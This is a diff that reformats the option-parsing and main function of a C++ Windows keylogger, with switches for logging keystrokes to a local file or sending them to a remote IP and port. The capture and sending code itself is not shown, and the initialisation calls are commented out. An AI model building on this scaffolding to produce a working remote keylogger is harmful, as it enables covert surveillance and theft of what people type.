@@ -22,38 +22,37 @@ void initialize_options(int argc, char** argv)
 	int t_result_option = 0;
 	int t_option_index = 0;
 
-	struct option t_long_options[] =
-	{
-		{LONG_OPTION_LOCAL, no_argument, NULL, SHORT_OPTION_LOCAL},
-		{LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH},
-		{LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE},
-		{LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH},
-		{LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH},
-		{LONG_OPTION_NO_ARROW, no_argument, NULL, SHORT_OPTION_NO_ARROW},
-		{LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK},
-		{LONG_OPTION_ASCII_ONLY, no_argument, NULL, SHORT_OPTION_ASCII_ONLY},
-		{LONG_OPTION_MAXIMUM_BUFFER_SIZE, required_argument, NULL, SHORT_OPTION_MAXIMUM_BUFFER_SIZE},
-		{LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP},
-		{NULL, 0, NULL, 0}
-	};
-
-	while ((t_result_option = getopt_long(argc, argv, "lf:ri:p:acAm:h",
-	t_long_options, &t_option_index)) != -1)
-	{
-		switch(t_result_option)
+	struct option t_long_options[] = {
 		{
-			case 0:
-				if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL) == 0)
-				{
-					if(g_keylogger != nullptr)
-						delete g_keylogger;
+			LONG_OPTION_LOCAL, no_argument, NULL, SHORT_OPTION_LOCAL }, {
+			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
+			LONG_OPTION_REMOTE, no_argument, NULL, SHORT_OPTION_REMOTE }, {
+			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
+			LONG_OPTION_FILE_PATH, required_argument, NULL, SHORT_OPTION_FILE_PATH }, {
+			LONG_OPTION_NO_ARROW, no_argument, NULL, SHORT_OPTION_NO_ARROW }, {
+			LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK }, {
+			LONG_OPTION_ASCII_ONLY, no_argument, NULL, SHORT_OPTION_ASCII_ONLY }, {
+			LONG_OPTION_MAXIMUM_BUFFER_SIZE, required_argument, NULL, SHORT_OPTION_MAXIMUM_BUFFER_SIZE }, {
+			LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP }, {
+			NULL, 0, NULL, 0 } };
 
-					g_keylogger = new keylogger_local();
+	while((t_result_option = getopt_long(argc, argv, "lf:ri:p:acAm:h", t_long_options, &t_option_index)) != -1)
+	{
+		switch (t_result_option)
+		{
+		case 0:
+			if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL) == 0)
+			{
+				if (g_keylogger != nullptr)
+					delete g_keylogger;
 
-					g_keylogger_local = true;
-					g_keylogger_remote = false;
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_FILE_PATH) == 0)
+				g_keylogger = new keylogger_local();
+
+				g_keylogger_local = true;
+				g_keylogger_remote = false;
+			}
+			else
+				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_FILE_PATH) == 0)
 				{
 					cout << "file path" << endl;
 
@@ -61,57 +60,65 @@ void initialize_options(int argc, char** argv)
 
 					g_file_path->append(optarg);
 				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_REMOTE) == 0)
-				{
-					if(g_keylogger != nullptr)
-						delete g_keylogger;
-
-					g_keylogger = new keylogger_remote();
-
-					g_keylogger_local = false;
-					g_keylogger_remote = true;
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_IP) == 0)
-				{
-					g_ip->clear();
-
-					g_ip->append(optarg);
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_PORT) == 0)
-				{
-					g_port = atoi(optarg);
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_ARROW) == 0)
-				{
-					//TODO
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
-				{
-					//TODO
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
-				{
-					//TODO
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
-				{
-					//TODO
-				}
-				else if(strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_HELP) == 0)
-				{
-					//TODO
-				}
 				else
-					//TODO
-					return;
+					if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_REMOTE) == 0)
+					{
+						if (g_keylogger != nullptr)
+							delete g_keylogger;
+
+						g_keylogger = new keylogger_remote();
+
+						g_keylogger_local = false;
+						g_keylogger_remote = true;
+					}
+					else
+						if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_IP) == 0)
+						{
+							g_ip->clear();
+
+							g_ip->append(optarg);
+						}
+						else
+							if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_PORT) == 0)
+							{
+								g_port = atoi(optarg);
+							}
+							else
+								if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_ARROW) == 0)
+								{
+									//TODO
+								}
+								else
+									if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
+									{
+										//TODO
+									}
+									else
+										if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
+										{
+											//TODO
+										}
+										else
+											if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_ASCII_ONLY) == 0)
+											{
+												//TODO
+											}
+											else
+												if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_HELP) == 0)
+												{
+													//TODO
+												}
+												else
+													//TODO
+													return;
 			break;
 
-			case SHORT_OPTION_FILE_PATH:
-				cout << "file path" << endl;
+		case SHORT_OPTION_FILE_PATH:
+			cout << "file path" << endl;
 
-				g_file_path->clear();
+			g_file_path->clear();
 
-				g_file_path->append(optarg);
+			g_file_path->append(optarg);
 			break;
 		}
 	}
@@ -128,7 +135,7 @@ void print_help()
 
 int main(int p_number_arguments, char** p_arguments_values)
 {
-	if(!SetConsoleCtrlHandler((PHANDLER_ROUTINE)exit_program, TRUE))
+	if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE) exit_program, TRUE))
 	{
 		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
 		return EXIT_FAILURE;
@@ -137,11 +144,11 @@ int main(int p_number_arguments, char** p_arguments_values)
 	initialize_options(p_number_arguments, p_arguments_values);
 
 	/*
-	if(g_keylogger_local == true)
-		reinterpret_cast<keylogger_local*>(g_keylogger)->initialize(*g_file_path);
-	else
-		reinterpret_cast<keylogger_remote*>(g_keylogger)->initialize(*g_ip, g_port);
-	*/
+	 if(g_keylogger_local == true)
+	 reinterpret_cast<keylogger_local*>(g_keylogger)->initialize(*g_file_path);
+	 else
+	 reinterpret_cast<keylogger_remote*>(g_keylogger)->initialize(*g_ip, g_port);
+	 */
 
 	delete g_file_path;
 	delete g_ip;
